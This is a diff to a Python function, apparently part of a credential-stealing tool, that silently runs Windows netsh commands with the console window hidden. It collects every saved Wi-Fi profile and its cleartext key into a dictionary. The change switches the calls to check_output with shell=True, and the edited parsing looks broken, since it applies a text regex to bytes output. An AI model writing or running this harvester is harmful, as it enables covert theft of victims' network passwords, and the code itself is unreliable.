@@ -1,5 +1,4 @@
-
-from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, run
+from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, PIPE, check_output
 from re import findall, search
 from os import environ
 from preferences.config import config
@@ -10,14 +9,14 @@ def Wifi():
     logs = []
     startupinfo = STARTUPINFO()
     startupinfo.dwFlags |= STARTF_USESHOWWINDOW
-    profiles_output = run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, startupinfo=startupinfo)
-    profile_names = findall(r':\s(.+)', profiles_output.stdout)
+    profiles_output = check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, stdin=PIPE, stderr=PIPE, startupinfo=startupinfo)
+    profile_names = findall(r':\s(.+)', profiles_output)
 
     wifi_passwords = {}
 
     for profile in profile_names:
-        password_output = run(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], capture_output=True, text=True, startupinfo=startupinfo)
-        password = search(r'Key Content\s+:\s(.+)', str(password_output.stdout))
+        password_output = check_output(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], shell=True, stdin=PIPE, stderr=PIPE, startupinfo=startupinfo)
+        password = search(r'Key Content\s+:\s(.+)', str(password_output))
 
         if password:
             wifi_passwords[profile] = password.group(1)
